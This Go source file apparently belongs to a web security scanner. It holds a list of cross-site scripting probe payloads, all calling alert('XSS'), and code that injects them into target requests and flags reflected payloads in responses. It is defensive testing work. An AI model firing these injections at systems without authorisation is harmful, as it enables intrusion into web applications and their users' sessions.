package general

import (
	"context"
	"strings"

	methodwebtest "github.com/Method-Security/methodwebtest/generated/go"
	utils "github.com/Method-Security/methodwebtest/utils/engines"
)

var alertXXSPayloads = []string{
	"<script>alert('XSS')</script>",
	"<img src='x' onerror='alert(\"XSS\")'>",
	"<a href='javascript:alert(\"XSS\")'>Click me</a>",
	"<button onclick='alert(\"XSS\")'>Click me</button>",
	`"><svg onload=alert('XSS')>`,
	`'-alert('XSS')-'`,
	"<iframe src='javascript:alert(\"XSS\")'></iframe>",
	"<body onload=alert('XSS')>",
	"<input type='text' value='XSS' onfocus=alert('XSS') autofocus>",
	"<select onchange=alert('XSS')><option>XSS</option></select>",
	"<textarea oninput=alert('XSS')>XSS</textarea>",
	"<embed src='data:text/html,<script>alert(\"XSS\")</script>'>",
	"<object data='javascript:alert(\"XSS\")'></object>",
	"<form onsubmit=alert('XSS')><input type='submit'></form>",
	"<video src=x onerror=alert('XSS')>",
	"<audio src=x onerror=alert('XSS')>",
	"<details open ontoggle=alert('XSS')><summary>XSS</summary></details>",
	"<marquee onstart=alert('XSS')>XSS</marquee>",
	"<form action='javascript:alert(\"XSS\")'><input type='submit'></form>",
	"<iframe src='javascript:alert(\"XSS\")'></iframe>"}

func PerformXSSAlertInjection(ctx context.Context, config *methodwebtest.MultiInjectionConfig) *methodwebtest.Report {
	generatedPayloads := utils.GenerateInjectionPayloads(alertXXSPayloads, config.VariableData)

	injectionConfig := methodwebtest.InjectionEngineConfig{
		Targets:           config.Targets,
		Method:            config.Method,
		Paths:             []string{"/"},
		InjectedPayloads:  generatedPayloads,
		InjectionLocation: config.InjectionLocation,
		EventType:         methodwebtest.NewEventTypeFromMultiEvent(methodwebtest.MultiEventXssalert),
		FollowRedirects:   true,
		Timeout:           config.Timeout,
		Retries:           config.Retries,
		Sleep:             config.Sleep,
	}

	report := utils.RunMultiInjectionsEngine(ctx, &injectionConfig)
	checkForXSSAlert(report)
	return report
}

func checkForXSSAlert(report *methodwebtest.Report) {
	for _, target := range report.Targets {
		if target.Attempts == nil {
			continue
		}
		for _, attempt := range target.Attempts {
			if attempt.Request == nil || attempt.Request.ResponseBody == nil {
				continue
			}
			finding := false
			if strings.Contains(*attempt.Request.ResponseBody, "alert('XSS')") {
				finding = true
			}
			if !finding && attempt.Request.ResponseHeaders != nil {
				for _, headerValue := range attempt.Request.ResponseHeaders {
					if strings.Contains(headerValue, "alert('XSS')") {
						finding = true
					}
				}
			}
			attempt.Finding = &finding
		}
	}
}
